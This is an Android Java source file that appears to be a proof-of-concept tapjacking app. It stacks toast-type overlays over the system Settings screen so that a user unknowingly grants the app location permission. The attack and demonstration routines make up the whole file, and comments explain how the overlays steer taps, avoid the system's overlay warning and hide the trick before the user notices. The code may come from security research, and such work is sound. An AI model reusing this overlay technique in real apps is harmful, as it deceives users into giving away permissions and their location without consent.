package net.babdcatha.toastoverlay;

import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import androidx.constraintlayout.widget.ConstraintLayout;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.text.Layout;
import android.util.Log;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    int type = WindowManager.LayoutParams.TYPE_TOAST;
    int flags = 0;

    ConstraintLayout main_layout;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button launchPermission = findViewById(R.id.launchPermission);
        Button resetPermission = findViewById(R.id.reset);
        Button attack = findViewById(R.id.attack);
        Button demonstration = findViewById(R.id.demonstration);

        TextView indicator = findViewById(R.id.indicator);

        Context context = this;

        //Layout used to size the different views appropriately
        main_layout = findViewById(R.id.main_layout);

        //Checking if we have the location permission
        if(ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED){
            indicator.setTextColor(Color.RED);
            indicator.setText("Location : refused");
        }else{
            indicator.setTextColor(Color.GREEN);
            indicator.setText("Location : granted");
        }

        //A Button to launch the app menu in the settings
        launchPermission.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent();
                intent.setAction(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                Uri uri = Uri.fromParts("package", getApplicationContext().getPackageName(), null);
                intent.setData(uri);
                context.startActivity(intent);

            }
        });

        //A button to quickly revoke all permissions
        resetPermission.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                ((ActivityManager)context.getSystemService(ACTIVITY_SERVICE)).clearApplicationUserData();
            }
        });

        //A button to launch the attack
        attack.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                WindowManager mWindowManager = (WindowManager) getApplication().getSystemService(Context.WINDOW_SERVICE);

                Intent intent = new Intent();
                intent.setAction(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                Uri uri = Uri.fromParts("package", getApplicationContext().getPackageName(), null);
                intent.setData(uri);
                context.startActivity(intent);

                createFirstAttackOverlay(context, mWindowManager, false);

            }
        });

        //A button to launch the attack with a transparent overlay
        demonstration.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                WindowManager mWindowManager = (WindowManager) getApplication().getSystemService(Context.WINDOW_SERVICE);

                createFirstAttackOverlay(context, mWindowManager, true);

                Intent intent = new Intent();
                intent.setAction(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                Uri uri = Uri.fromParts("package", getApplicationContext().getPackageName(), null);
                intent.setData(uri);
                context.startActivity(intent);

            }
        });

    }

    void createFirstAttackOverlay(Context context, WindowManager mWindowManager, Boolean transparent){

        //View 1 and 3 are not clickable, and are here to prevent the user from clicking on another
        //tile that the one we want. They can also be used to display information to entice the user
        //to click where we want it to.

        //View2 is a clickable overlay, spanning over the tile we want the user to click.

        //View 4 is unclickable and covers most of the screen. It is here to hide the transitions
        //in the settings menu.

        View view1;
        View view2;
        View view3;
        View view4;

        int layout1;
        int layout2;
        int layout3;
        int layout4;

        if(transparent){
            layout1 = R.layout.unclickable_layout;
            layout2 = R.layout.clickable_layout;
            layout3 = R.layout.unclickable_layout;
            layout4 = R.layout.unclickable_layout;
        }else{
            layout1 = R.layout.description_overlay;
            layout2 = R.layout.permissions_overlay;
            layout3 = R.layout.blank_layout;
            layout4 = R.layout.blank_layout;
        }

        view1 = View.inflate(context, layout1, null);
        WindowManager.LayoutParams layoutParams1 = new WindowManager.LayoutParams(main_layout.getLayoutParams().width,
                1225,
                0, 0,
                type,
                flags | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                        | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                PixelFormat.TRANSLUCENT
        );
        layoutParams1.gravity=Gravity.LEFT|Gravity.TOP;

        view2 = View.inflate(context, layout2, null);
        WindowManager.LayoutParams layoutParams2 = new WindowManager.LayoutParams(main_layout.getLayoutParams().width,
                250,
                0, 1225,
                type,
                flags | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                PixelFormat.TRANSLUCENT
        );

        layoutParams2.gravity=Gravity.LEFT|Gravity.TOP;

        view3 = View.inflate(context, layout3, null);
        WindowManager.LayoutParams layoutParams3 = new WindowManager.LayoutParams(main_layout.getLayoutParams().width,
                835,
                0, 1475,
                type,
                flags | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                PixelFormat.TRANSLUCENT
        );

        layoutParams3.gravity=Gravity.LEFT|Gravity.TOP;

        view4 = View.inflate(context, layout4, null);
        WindowManager.LayoutParams layoutParams4 = new WindowManager.LayoutParams(main_layout.getLayoutParams().width,
                2086,
                0, 222,
                type,
                flags | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                PixelFormat.TRANSLUCENT
        );
        layoutParams4.gravity=Gravity.LEFT|Gravity.TOP;

        //We display the three overlays
        mWindowManager.addView(view1, layoutParams1);
        mWindowManager.addView(view2, layoutParams2);
        mWindowManager.addView(view3, layoutParams3);

        //Since view2 is not interactive, we cannot know when the user clicked on it, to switch our
        //overlays for the next phase of the attack. To avoid this issue, we use the onTouch listener
        //of view1, and check for the when user clicks outside of it. Since view3 is also unclickable,
        //it will not trigger this event. The only time this will trigger is when the user clicks on
        //view2.
        view1.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View view, MotionEvent motionEvent) {
                if(motionEvent.getAction() == MotionEvent.ACTION_OUTSIDE) {

                    mWindowManager.addView(view4, layoutParams4);

                    createSecondAttackOverlay(context, mWindowManager, transparent);

                    //Waiting 100ms, to be sure that the second page of overlays is finished rendering
                    view1.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            mWindowManager.removeView(view1);
                            mWindowManager.removeView(view2);
                            mWindowManager.removeView(view3);
                            mWindowManager.removeView(view4);
                        }
                    }, 100);

                    return true;
                }
                return false;
            }
        });
    }

    void createSecondAttackOverlay(Context context, WindowManager mWindowManager, Boolean transparent){

        //Views 1, 2 and 3 are unclickable and are here to prevent the user from clicking on things
        //We don't want. View2 does not cover the permission slider, because this would be recognized
        //by the system as an overlay, and would require the app to get the "Display over other apps"
        //Permission. By doing this, we cannot cover the thing the user will click, but we can avoid
        //the system warning the user that something is wrong.

        //View4 is also here to cover the transitions in the settings menu.

        View view1;
        View view2;
        View view3;
        View view4;

        int layout1;
        int layout2;
        int layout3;
        int layout4;

        if(transparent){
            layout1 = R.layout.unclickable_layout;
            layout2 = R.layout.unclickable_layout;
            layout3 = R.layout.unclickable_layout;
            layout4 = R.layout.unclickable_layout;
        }else{
            layout1 = R.layout.final_page_top_overlay;
            layout2 = R.layout.location_overlay;
            layout3 = R.layout.blank_layout;
            layout4 = R.layout.blank_layout;
        }

        view1 = View.inflate(context, layout1, null);
        WindowManager.LayoutParams layoutParams1 = new WindowManager.LayoutParams(main_layout.getLayoutParams().width,
                392,
                0, 0,
                type,
                flags | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                        | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                PixelFormat.TRANSLUCENT
        );
        layoutParams1.gravity=Gravity.LEFT|Gravity.TOP;

        view2 = View.inflate(context, layout2, null);
        WindowManager.LayoutParams layoutParams2 = new WindowManager.LayoutParams(1200,
                200,
                0, 392,
                type,
                flags | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                PixelFormat.TRANSLUCENT
        );
        layoutParams2.gravity=Gravity.LEFT|Gravity.TOP;

        view3 = View.inflate(context, layout3, null);
        WindowManager.LayoutParams layoutParams3 = new WindowManager.LayoutParams(main_layout.getLayoutParams().width,
                1716,
                0, 592,
                type,
                flags | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                PixelFormat.TRANSLUCENT
        );
        layoutParams3.gravity=Gravity.LEFT|Gravity.TOP;

        view4 = View.inflate(context, layout4, null);
        WindowManager.LayoutParams layoutParams4 = new WindowManager.LayoutParams(main_layout.getLayoutParams().width,
                2086,
                0, 222,
                type,
                flags | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                PixelFormat.TRANSLUCENT
        );
        layoutParams4.gravity=Gravity.LEFT|Gravity.TOP;

        mWindowManager.addView(view1, layoutParams1);
        mWindowManager.addView(view2, layoutParams2);
        mWindowManager.addView(view3, layoutParams3);
        mWindowManager.addView(view4, layoutParams4);

        view4.postDelayed(new Runnable() {
            @Override
            public void run() {
                mWindowManager.removeView(view4);
            }
        }, 500);

        view1.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View view, MotionEvent motionEvent) {
                if(motionEvent.getAction() == MotionEvent.ACTION_OUTSIDE){
                    view1.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            //Once done, we return to the main menu before the user can click again,
                            //and potentially notice something wrong.

                            mWindowManager.addView(view4, layoutParams4);
                            Intent intent = new Intent(context , MainActivity.class);
                            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                            startActivity(intent);
                        }
                    }, 200);

                    view1.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            mWindowManager.removeView(view1);
                            mWindowManager.removeView(view2);
                            mWindowManager.removeView(view3);
                            mWindowManager.removeView(view4);
                        }
                    }, 500);

                    return true;
                }
                return false;
            }
        });

    }

}